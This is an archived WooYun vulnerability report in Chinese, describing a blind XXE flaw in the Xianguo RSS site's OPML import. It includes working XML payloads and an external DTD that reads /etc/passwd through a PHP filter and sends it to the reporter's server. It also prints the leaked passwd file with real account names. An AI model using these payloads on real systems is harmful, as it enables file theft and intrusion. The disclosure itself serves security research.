{"id": 1662, "wybug_id": "wooyun-2014-074069", "wybug_title": "鲜果网RSS导入Blind XXE漏洞", "wybug_corp": "鲜果网", "wybug_author": "iv4n", "wybug_date": "2014-08-27 16:07", "wybug_open_date": "2014-09-01 16:08", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 鲜果网支持导入 OPML文件格式的订阅，本质还是XML格式，由于处理不严格导致Blind XXE漏洞。 详细说明：  http://xianguo.com/my/opml不怎么用鲜果，不过在测试其他的地方的时候发现的一个问题，Blind XXE是老漏洞，PHP的OOB也没啥难度， 不过没看到wooyun有实例，就放出来了。一般的XXE漏洞测试流程：1. 是否支持解析实体 ——> 2. 是否支持解析外部实体 1. 通常步骤是先看能否解析实体\n<!DOCTYPE note [<!ENTITY test  \"ivan_test\">]>&test;\n2. 然后看看能否引用外部实体（当然，如果修补方案是过滤这里还需要测试通过DOCTYPE引入DTD的情况）\n<!DOCTYPE note [<!ENTITY test SYSTEM \"http://1v4n.sinaapp.com\">]>&test;\n不幸的是此路不通，所以就上主角了：Blind XXE。 纯Blind XXE的核心就是参数实体了，有几个特性：\n通过%引用只能在DTD内部 立即即引用实体嵌套\n上POC：<!DOCTYPE root [ <!ENTITY % remote SYSTEM\t\"http://1v4n.sinaapp.com/xxxxxxx\">\t%remote;\t]> 导入的时候，看看自己服务器的日志，有访问，证明外部实体引用成功。剩下的就是OOB了，看了下是PHP，可惜没Expect 扩展，直接使用php wrapper，php://filter/read=convert.base64-encode/resource=file:///etc/passwd 导出数据。至于能干什么，就看SSRF功底和运气了，这里就读取/etc/passwd。导入POC：\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE note [<!ENTITY % remote SYSTEM\t\"http://1v4n.sinaapp.com/xxe/evil_php.xml\">\t%remote;\t]><opml version=\"1.0\">\t<head>\t\t<title>subscriptions</title>\t\t<dateCreated>2014-07-09 11:34:09</dateCreated>\t\t<ownerName></ownerName>\t</head>\t<body>\t\t<outline text=\"应用邦\" \t\t\ttitle=\"应用邦\" type=\"rss\"\t\t\thtmlUrl=\"http://de.appchina.com\" \t\t\txmlUrl=\"http://de.appchina.com/feed/\" />\t\t<outline text=\"elle中文网\" \t\t\ttitle=\"elle中文网\" type=\"rss\"\t\t\thtmlUrl=\"http://www.ellechina.com/?s_cid=xianguolife\" \t\t\txmlUrl=\"http://www.ellechina.com/xml/rss/xianguo_life_rss.xml\" />\t</body></opml>\n引用的：1v4n.sinaapp.com/xxe/evil_php.xml 代码如下（这里的url改成自己的服务器，不然数据又到我的server上了，o(╯□╰)o）：\n<!ENTITY % payload\tSYSTEM\t \"php://filter/read=convert.base64-encode/resource=file:///etc/passwd\"><!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://1v4n.sinaapp.com/?xxe_local=%payload;'>\">%int;%trick;\n   漏洞证明：  \n\nbase64解密\nroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shsshd:x:101:65534::/var/run/sshd:/usr/sbin/nologinxianguo:x:1000:1000:xianguo:/home/xianguo:/bin/bashwww:x:102:1001:www:/home/www:/bin/bashmessagebus:x:103:104::/var/run/dbus:/bin/falsezhaobaohua:x:1001:1002:,,,:/home/zhaobaohua:/bin/bashsnmp:x:104:105::/var/lib/snmp:/bin/falsenagios:x:105:106::/home/nagios:/bin/falseawstats:x:1002:1003:,,,:/home/awstats:/bin/bashstatd:x:106:65534::/var/lib/nfs:/bin/falsepuppet:x:1003:1004::/home/puppet:/sbin/nologinnginx:x:1004:1005::/home/nginx:/bin/falsemysql:x:1005:1006::/home/mysql:/bin/falseredis:x:107:107:redis server,,,:/var/lib/redis:/bin/falsezhangrenning:x:1006:1007:,,,:/home/zhangrenning:/bin/bashhudingguo:x:1007:1008:,,,:/home/hudingguo:/bin/bashsaihu:x:1008:1009:,,,:/home/saihu:/bin/bashhuaping:x:1009:1001::/home/huaping:/bin/sh\n   修复方案：  禁止实体 OR 过滤   版权声明：转载请注明来源 iv4n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-09-01 16:08 厂商回复：  漏洞Rank：10  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-27 16:09 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  blind xxe    \n     2014-08-27 16:14 |    \t\t海绵宝宝 \t\t\t( 普通白帽子  |\t\t\t        Rank:243 漏洞数:50        | 唯有梦想与好姑娘不可辜负.)\t\t \n  mark    \n     2014-09-01 16:31 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  学习了    \n     2014-09-01 16:34 |    \t\tYwiSax \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:4        | 淡定。)\t\t \n  这么吊都忽略了?    \n     2014-09-02 08:55 |    \t\t3xpl0it \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:15        | 0xExploit)\t\t \n  叼    \n     2014-09-02 12:09 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  好叼    \n     2014-09-02 14:05 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:33        | 哎)\t\t \n  要知道 鲜果的那个   #alert(1)也没修复呢  pz很久以前就爆了    \n     2015-02-27 17:11 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  精华之 ：）    \n     2015-06-02 10:26 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @xsser 嗯 温故而知新,可以为师以    \n     2015-06-02 20:11 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  好厉害，赞赞赞    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}